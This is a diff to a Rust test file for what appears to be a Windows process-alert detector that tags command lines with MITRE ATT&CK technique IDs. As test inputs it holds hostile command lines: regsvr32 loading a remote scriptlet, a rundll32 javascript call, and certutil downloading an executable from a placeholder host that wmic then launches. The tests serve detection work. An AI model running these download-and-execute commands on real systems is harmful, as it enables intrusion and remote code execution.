@@ -9651,6 +9651,11 @@ fn audit_p1_prc003_certutil_sans_t1047() {
                        ("regsvr32 /s /n /u /i:http://x/y.sct scrobj.dll", "T1218"), ("rundll32 javascript:\"\\..\\mshtml\"", "T1218")] {
         assert_eq!(crate::processus::technique_prc003(ligne), t, "{ligne}");
     }
+    // Prérelecture de #258, réserve 1 : deux outils vus, les deux techniques
+    let deux = info_processus_test(r"C:\Windows\System32\cmd.exe", r"cmd /c certutil -urlcache -f http://x/a.exe a.exe & wmic process call create a.exe");
+    let mut c = crate::processus::alerte_processus(2, &deux).expect("PRC-003");
+    crate::mitre::enrichir(&mut c);
+    assert_eq!(crate::mitre::identifiants(&c), ["T1105", "T1047"]);
 }
 
 /// PER-001 sur une clé Run : T1547.001, jamais T1546.003 ni les autres types de la règle
